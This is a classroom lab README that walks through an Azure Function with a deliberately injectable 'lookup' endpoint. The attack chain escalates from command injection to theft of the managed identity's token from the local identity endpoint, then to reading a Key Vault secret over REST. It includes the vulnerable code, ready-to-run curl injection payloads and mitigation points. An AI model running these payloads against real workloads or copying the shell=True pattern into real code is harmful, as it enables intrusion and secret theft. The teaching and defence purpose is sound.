# Azure Function — Key Vault Secret Leak via Managed Identity Abuse

Live classroom demo: a Function legitimately uses its managed identity to
read a Key Vault secret server-side and never returns it — but a command
injection bug elsewhere in the same Function lets an attacker steal the
identity's own token and read the secret **directly from Key Vault**,
completely bypassing the app's own restraint.

```
Application Vulnerability  →  Function Compromised  →  Managed Identity  →  Key Vault Secrets User  →  Secret Value
```

Tested end to end 2026-09-18 — this actually happened against the live
resources below, not a hypothetical: the injected command retrieved a real
OAuth token scoped to `vault.azure.net`, and that token was used to fetch
`DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c` straight from Key Vault's REST
API, with no `az login` and no Key Vault RBAC grant to the attacker at all.

## Environment

| Resource | Value |
|---|---|
| Subscription | `QaVerify SetupCheck - Sub` (`9d8d5a47-4453-42f7-840f-648c01ed5308`) |
| Resource group | `rg-func-kv-leak-lab` (region `eastus2`) |
| Function App | `func-kv-leak-lab-24693` (Linux, Python 3.11, Consumption plan) |
| Key Vault | `kv-leak-lab-15482`, RBAC authorization mode |
| Secret | `db-password` = `DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c` (fake demo value) |
| Managed identity | System-assigned, principal id `420d19f1-36df-4b9b-9cdd-60d32cb296af` |
| Role granted to identity | **Key Vault Secrets User** (get/list only) scoped to this one vault — this is a *reasonable-looking*, minimal-seeming grant. The demo's point: even "least privilege" read access is a full secret leak once the app is compromised. |

## The code

`function_app.py` has two endpoints:

```python
@app.route(route="db-status", methods=["GET"])
def db_status(req):
    # Legit use: fetch secret server-side, only ever return a boolean/length
    client = SecretClient(vault_url=VAULT_URL, credential=DefaultAzureCredential())
    secret = client.get_secret(SECRET_NAME)
    return func.HttpResponse(f"DB configured: True (secret length={len(secret.value)})")

@app.route(route="lookup", methods=["GET"])
def lookup(req):
    # Vulnerable: unsanitized input into a shell command
    host = req.params.get("host", "127.0.0.1")
    result = subprocess.run(f"getent hosts {host}", shell=True, capture_output=True, text=True, timeout=15)
    return func.HttpResponse(result.stdout + result.stderr)
```

`/api/db-status` is exactly what "correct" managed-identity usage looks
like — the secret never leaves the process. `/api/lookup` is an unrelated
"hostname lookup" diagnostics endpoint with a classic command-injection bug.
The vulnerability doesn't need to be anywhere near the Key Vault code — any
code-exec bug in the same Function process inherits the same identity and
the same access.

## Deploy

Note: the Python packages (`azure-identity`, `azure-keyvault-secrets`) must
be vendored into the zip — `az functionapp deployment source config-zip`
uses a "run from package" blob path for Linux Python Consumption apps that
does **not** run a remote pip build, even with
`SCM_DO_BUILD_DURING_DEPLOYMENT=true` set.

```bash
RG=rg-func-kv-leak-lab
LOC=eastus2
STORAGE=stfunckvleak$RANDOM
FUNCAPP=func-kv-leak-lab-$RANDOM
KV=kv-leak-lab-$RANDOM

az group create -n $RG -l $LOC
az storage account create -n $STORAGE -g $RG -l $LOC --sku Standard_LRS
az provider register --namespace Microsoft.KeyVault   # one-time per subscription
az keyvault create -n $KV -g $RG -l $LOC --enable-rbac-authorization true
az functionapp create -g $RG --consumption-plan-location $LOC \
  --runtime python --runtime-version 3.11 --functions-version 4 \
  --name $FUNCAPP --storage-account $STORAGE --os-type Linux

# Create the demo secret (needs Key Vault Secrets Officer on yourself first)
MY_OID=$(az ad signed-in-user show --query id -o tsv)
SUB_ID=$(az account show --query id -o tsv)
az role assignment create --assignee-object-id $MY_OID --assignee-principal-type User \
  --role "Key Vault Secrets Officer" --scope /subscriptions/$SUB_ID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$KV
sleep 30  # RBAC propagation
az keyvault secret set --vault-name $KV -n db-password --value "DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c"

# Give the Function's identity read-only access to the vault
PRINCIPAL_ID=$(az functionapp identity assign -g $RG -n $FUNCAPP --query principalId -o tsv)
az role assignment create --assignee-object-id $PRINCIPAL_ID --assignee-principal-type ServicePrincipal \
  --role "Key Vault Secrets User" --scope /subscriptions/$SUB_ID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$KV

az functionapp config appsettings set -g $RG -n $FUNCAPP --settings \
  AzureWebJobsFeatureFlags=EnableWorkerIndexing \
  SCM_DO_BUILD_DURING_DEPLOYMENT=true \
  KEY_VAULT_URL=https://$KV.vault.azure.net/ \
  DB_SECRET_NAME=db-password

# Vendor dependencies into the zip (this is the part that must not be skipped)
pip3 install --target=.python_packages/lib/site-packages \
  --platform manylinux2014_x86_64 --implementation cp --python-version 3.11 \
  --only-binary=:all: -r requirements.txt

zip -rq /tmp/kv-leak-demo.zip . -x "*.git*"
az functionapp deployment source config-zip -g $RG -n $FUNCAPP --src /tmp/kv-leak-demo.zip
```

## How to demo in class

1. Show the legit path — secret used, never exposed:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/db-status"
# DB configured: True (secret length=40)
```

2. Show the vulnerable endpoint working normally:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/lookup?host=example.com"
```

3. Prove command injection / RCE:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/lookup?host=127.0.0.1;id"
# uid=1000(app) gid=1000(app) groups=1000(app)
```

4. Steal the identity's Key Vault-scoped token through the same injection
   point (Azure Functions/App Service exposes managed identity via the
   `IDENTITY_ENDPOINT` / `IDENTITY_HEADER` env vars on localhost, **not**
   the VM-style `169.254.169.254` IMDS endpoint):

```bash
curl -G "https://$FUNCAPP.azurewebsites.net/api/lookup" \
  --data-urlencode 'host=127.0.0.1;curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01"'
```

Extract `access_token` from the JSON response.

5. Use the stolen token to read the secret **directly from Key Vault** —
   the attacker never had any Key Vault role assignment of their own:

```bash
TOKEN="<access_token from step 4>"
curl -H "Authorization: Bearer $TOKEN" \
  "https://$KV.vault.azure.net/secrets/db-password?api-version=7.4"
```

Result:

```json
{"value":"DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c", ...}
```

Point out: the attacker got the plaintext secret **without ever calling
`db-status`**, without any Key Vault RBAC grant of their own, and without
touching Azure credentials — the app's own "only return a boolean" logic
was completely bypassed by going straight to the identity + the vault's
REST API.

## Mitigation talking points

- **Fix the app vulnerability first** — `subprocess.run([...])` with an
  argument list, never `shell=True` with unsanitized input.
- **"Least privilege" Key Vault access is still full access to that
  secret** — `Key Vault Secrets User` sounds minimal, but if the workload
  is compromised, the attacker gets every secret that role can read, not
  just the one the app's own code happens to fetch.
- **Split secrets across vaults / use per-secret RBAC conditions** if a
  Function only needs one specific secret — Azure RBAC supports
  data-action conditions scoped to a secret name.
- **Rotate secrets Functions can read, and monitor Key Vault access logs**
  for reads that don't correlate with an actual app code path — that's the
  detection signal for exactly this attack.
- **Same lesson as the Kubernetes ServiceAccount and Contributor-identity
  demos**: the managed identity itself isn't the flaw — what it's allowed
  to reach is.

## Cleanup

```bash
az group delete -n rg-func-kv-leak-lab --yes --no-wait
```
